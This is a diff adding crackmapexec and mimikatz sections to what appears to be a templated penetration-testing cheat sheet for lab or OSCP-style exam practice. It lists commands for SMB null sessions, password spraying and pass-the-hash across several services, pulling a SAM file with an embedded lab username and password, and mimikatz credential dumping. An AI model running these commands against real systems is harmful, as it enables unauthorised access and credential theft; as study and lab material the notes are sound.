@@ -80,7 +80,42 @@ fuser -k 8080/tcp
 
 ```
 
+## crackmapexec
+```bash
+# local auth
+--local-auth
 
+#smb
+crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --pass-pol
+crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --shares
+crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "username" -p "password" --shares
+crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "username" -p "password" --continue-on-success
+
+#ssh
+crackmapexec ssh <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success
+
+#ftp
+crackmapexec ftp <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success
+
+#mssql
+crackmapexec mssql <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>"
+crackmapexec mssql 10.10.85.148 -u sql_svc -p Dolphin1 -d oscp.exam --get-file "C:\TEMP\SAM" SAM
+
+#winrm
+crackmapexec winrm <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %>  --continue-on-success
+crackmapexec winrm <% tp.frontmatter["RHOST"] %>  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success
+
+```
+
+
+## mimikatz
+```bash
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+lsadump::sam
+
+```
 
 
 ## Code Snippet to check where our code is executed
